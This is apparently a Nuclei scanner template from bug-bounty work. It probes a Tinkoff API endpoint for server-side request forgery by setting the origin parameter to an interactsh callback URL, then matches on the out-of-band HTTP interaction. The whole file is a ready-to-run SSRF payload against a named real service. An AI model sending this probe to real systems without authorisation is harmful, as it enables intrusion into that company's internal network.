id: tinkoff-ssrf

info:
  name: Tinkoff - Server-Side Request Forgery
  author: bugbounty
  severity: critical
  description: SSRF via origin parameter with interactsh validation
  tags: ssrf,tinkoff
  reference:
    - https://portswigger.net/web-security/ssrf

http:
  - raw:
      - |
        GET /api/common/v1/session_info?platform=web&sessionid=test&origin=http://{{interactsh-url}}/callback HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: status
        status:
          - 200
          - 201
          - 301
          - 302

    extractors:
      - type: regex
        name: interaction
        part: interactsh_request
        regex:
          - '([a-z0-9\-]+)\.([a-z0-9]+)\.interact\.sh'
